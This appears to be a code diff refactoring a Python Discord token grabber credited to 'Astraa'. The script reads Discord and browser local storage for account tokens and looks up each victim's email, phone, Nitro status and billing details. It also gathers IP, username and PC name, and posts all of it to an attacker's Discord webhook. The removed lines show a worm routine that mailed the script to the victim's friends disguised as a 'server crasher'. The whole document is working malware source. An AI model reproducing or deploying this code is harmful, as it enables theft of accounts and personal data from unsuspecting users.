@@ -1,27 +1,29 @@
-import os
-if os.name != "nt":
-    exit()
+from os import getenv, listdir, name as _name, path as _path
 from re import findall
-from json import loads, dumps
+from json import loads
 from base64 import b64decode
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
-from datetime import datetime
-from threading import Thread
-from time import sleep
-from sys import argv
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
+from requests import get
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+#====================================== vars ====================================== 
+
+LOCAL = getenv("LOCALAPPDATA")
+ROAMING = getenv("APPDATA")
 PATHS = {
-    "Discord"           : ROAMING + "\\Discord",
-    "Discord Canary"    : ROAMING + "\\discordcanary",
-    "Discord PTB"       : ROAMING + "\\discordptb",
-    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
-    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    "Discord"           : f"{ROAMING}\\Discord",
+    "Discord Canary"    : f"{ROAMING}\\discordcanary",
+    "Discord PTB"       : f"{ROAMING}\\discordptb",
+    "Google Chrome"     : f"{LOCAL}\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : f"{ROAMING}\\Opera Software\\Opera Stable",
+    "Opera GX"          : f"{ROAMING}\\Opera Software\\Opera GX Stable",
+    "Brave"             : f"{LOCAL}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : f"{LOCAL}\\Yandex\\YandexBrowser\\User Data\\Default"
 }
+
+#====================================== definitions ====================================== 
+
 def getheaders(token=None, content_type="application/json"):
     headers = {
         "Content-Type": content_type,
@@ -30,15 +32,18 @@ def getheaders(token=None, content_type="application/json"):
     if token:
         headers.update({"Authorization": token})
     return headers
+
 def getuserdata(token):
+    #use urlopen bc requests no work if an account is disabled
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
     except:
         pass
+
 def gettokens(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
-    for file_name in os.listdir(path):
+    for file_name in listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
         for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
@@ -46,75 +51,51 @@ def gettokens(path):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
-def getdeveloper():
-    dev = "wodx"
-    try:
-        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
-    except:
-        pass
-    return dev
+
 def getip():
     ip = "None"
     try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        return get("https://api.ipify.org").text
     except:
-        pass
-    return ip
+        return ip
+
 def getavatar(uid, aid):
     url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
     try:
-        urlopen(Request(url))
+        get(url)
     except:
         url = url[:-4]
     return url
+
 def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-def getfriends(token):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
-    except:
-        pass
-def getchat(token, uid):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-    except:
-        pass
+
 def has_payment_methods(token):
     try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+        return bool(len(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))) > 0)
     except:
         pass
-def send_message(token, chat_id, form_data):
-    try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
-    except:
-        pass
-def spread(token, form_data, delay):
-    return # Remove to re-enabled
-    for friend in getfriends(token):
-        try:
-            chat_id = getchat(token, friend["id"])
-            send_message(token, chat_id, form_data)
-        except Exception as e:
-            pass
-        sleep(delay)
+
+
+
+#====================================== grabber main code ====================================== 
+
 def main():
-    cache_path = ROAMING + "\\.cache~$"
-    prevent_spam = True
-    self_spread = True
+
+    cache_path = f"{ROAMING}\\.cache~$"
     embeds = []
     working = []
     checked = []
     already_cached_tokens = []
     working_ids = []
     ip = getip()
-    pc_username = os.getenv("UserName")
-    pc_name = os.getenv("COMPUTERNAME")
-    user_path_name = os.getenv("userprofile").split("\\")[2]
-    developer = getdeveloper()
+    pc_username = getenv("UserName")
+    pc_name = getenv("COMPUTERNAME")
+
+    
     for platform, path in PATHS.items():
-        if not os.path.exists(path):
+        if not _path.exists(path):
             continue
         for token in gettokens(path):
             if token in checked:
@@ -131,8 +112,10 @@ def main():
             user_data = getuserdata(token)
             if not user_data:
                 continue
+            
             working_ids.append(uid)
             working.append(token)
+            
             username = user_data["username"] + "#" + str(user_data["discriminator"])
             user_id = user_data["id"]
             avatar_id = user_data["avatar"]
@@ -141,58 +124,35 @@ def main():
             phone = user_data.get("phone")
             nitro = bool(user_data.get("premium_type"))
             billing = bool(has_payment_methods(token))
-            embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "**Account Info**",
-                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**PC Info**",
-                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**Token**",
-                        "value": token,
-                        "inline": False
-                    }
-                ],
-                "author": {
-                    "name": f"{username} ({user_id})",
-                    "icon_url": avatar_url
-                },
-                "footer": {
-                    "text": f"Token Grabber By Astraa",
-                }
-            }
+            
+            #webhook embed 
+            embed = DiscordEmbed(title=f"**{username} ({user_id})** information's", description=" ", icon_url=avatar_url,  color='0x7289da')
+            embed.add_embed_field(name="**Account Info**", value=f"Email: ``{email}``\nPhone: ``{phone}``\nNitro: ``{nitro}``\nBilling Info: ``{billing}``", inline=True)
+            embed.add_embed_field(name="**PC Info**", value=f'IP: ``{ip}``\nUsername: ``{pc_username}``\nPC Name: ``{pc_name}``\nToken Location: ``{platform}``', inline=True)
+            embed.add_embed_field(name="**Token**", value=f"``{token}``" , inline=False)
+            embed.set_footer(text='Token Grabber By Astraa')
             embeds.append(embed)
+    
     with open(cache_path, "a") as file:
         for token in checked:
             if not token in already_cached_tokens:
                 file.write(token + "\n")
+    
     if len(working) == 0:
         working.append('123')
-    webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
-    }
-    try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
-    except:
-        pass
-    if self_spread:
-        for token in working:
-            with open(argv[0], encoding="utf-8") as file:
-                content = file.read()
-            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
-            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
-try:
-    main()
-except Exception as e:
-    print(e)
-    pass
+
+    #webhook settings
+    webhook = DiscordWebhook(url='YOUR WEBHOOK URL', username="Discord Token Grabber", avatar_url="https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png")
+    #webhook embed adder system
+    for embed in embeds:
+        webhook.add_embed(embed)
+    #webhhok sender
+    webhook.execute()
+
+if __name__ == "__main__" :
+    if _name == "nt":
+        main()
+    else:
+        exit()
+else:
+    exit()
